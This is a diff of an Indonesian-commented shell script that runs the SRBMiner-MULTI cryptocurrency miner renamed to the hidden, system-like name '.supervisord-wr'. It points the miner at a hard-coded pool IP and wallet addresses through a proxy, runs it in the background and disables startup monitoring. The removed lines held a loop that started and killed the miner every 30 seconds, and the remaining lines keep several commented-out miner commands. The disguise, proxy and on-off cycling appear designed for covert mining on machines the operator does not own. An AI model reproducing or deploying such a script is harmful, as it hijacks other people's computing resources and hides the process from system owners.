@@ -29,35 +29,3 @@
 #mv SRBMiner-MULTI .supervisord-wr && ./.supervisord-wr --algorithm xelishashv2_pepew --disable-gpu --pool 103.249.70.7:5778 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=X8vPepew --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8
 #mv SRBMiner-MULTI .supervisord-wr && ./.supervisord-wr --algorithm yespowerr16 --disable-gpu --pool 103.249.70.7:6534 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker cpuXidx --password c=LTC,ID=8XYTN --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8
 #mv SRBMiner-MULTI .supervisord-wr && ./.supervisord-wr --algorithm xelishashv2_pepew --disable-gpu --pool 103.249.70.7:5778 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker cpuXidx --password c=LTC,ID=8Xpepew --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8
-
-mv SRBMiner-MULTI .supervisord-wr
-
-# Nama aplikasi
-APP="./.supervisord-wr --algorithm xelishashv2_pepew --disable-gpu --pool 103.249.70.7:5778 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --worker cpuXidx --password c=LTC,ID=8Xpepew --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8"
-
-# Interval waktu dalam detik
-RUN_TIME=30  # 30 detik
-WAIT_TIME=30  # 30 detik
-
-# Loop tak terbatas
-while true; do
-    echo "Menjalankan aplikasi: $APP"
-    # Jalankan aplikasi di background
-    $APP &
-    APP_PID=$!  # Simpan PID aplikasi
-
-    # Tunggu selama 30 detik
-    sleep $RUN_TIME
-
-    # Cek apakah proses masih berjalan
-    if ps -p $APP_PID > /dev/null; then
-        echo "Menghentikan aplikasi dengan PID: $APP_PID"
-        kill $APP_PID
-    else
-        echo "Proses aplikasi tidak ditemukan, tidak perlu menghentikan."
-    fi
-
-    # Tunggu selama 30 detik sebelum memulai ulang
-    echo "Menunggu selama $WAIT_TIME detik sebelum memulai ulang."
-    sleep $WAIT_TIME
-done
